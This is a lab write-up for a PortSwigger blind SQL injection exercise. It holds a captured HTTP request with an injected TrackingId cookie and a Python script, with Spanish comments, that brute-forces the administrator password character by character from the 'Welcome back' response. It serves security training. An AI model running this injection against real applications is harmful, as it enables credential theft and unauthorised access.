# Lab: Blind SQL injection with conditional responses

PRACTITIONER

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a `Welcome back` message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

```java
GET / HTTP/2
Host: 0a31007504f114f680ed6c5d00210057.web-security-academy.net
Cookie: TrackingId=MwY9v9yFEFk6EsRw' and (select substring(password,1,1)from users where username='administrator' )='q' -- -; session=S2ChVUIkbP0LT7xuNVLrn2hE07bQU37z
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Brave";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-Gpc: 1
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i


```

```python
#!/usr/bin/env python3
import requests
import sys
import signal
import string


def def_handler(sig, frame):
print("\n[!] Exiting...")
sys.exit(1)


signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

  
def makeSQLI():

# Asegúrate de que esta URL sea exactamente la de tu pestaña actual del laboratorio

url = 'https://0a1700a2041da3608150ee9200ac006b.web-security-academy.net/'

print("[+] Iniciando script... Probando caracteres:")

password = ""

for position in range(1, 21):

found = False

for char in characters:

cookies = {

'TrackingId': f"wBqbgklXMzKWjXc6' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--",

'session': 'c7UAYyP1FFWtcXIXFwS5qpTeqP8RigRk'

}

try:

r = requests.get(url, cookies=cookies, timeout=5)

# ESTO ES CLAVE: Imprime lo que está probando para ver que avanza

print(f"Probando posición {position} con '{char}' -> Status: {r.status_code}")

# Cambia "Welcome back!" por el texto exacto que aparece en tu navegador cuando logras entrar

if "Welcome back!" in r.text:

password += char

print(f"\n[+] ¡ÉXITO! Carácter encontrado en posición {position}: '{char}' --> Contraseña parcial: {password}\n")

found = True

break

except requests.exceptions.RequestException as e:

print(f"[-] Error de conexión: {e}")

if not found:

print(f"\n[+] Búsqueda finalizada. Contraseña completa: {password}")

break

  

if __name__ == '__main__':

makeSQLI()
```


![[class11.png]]
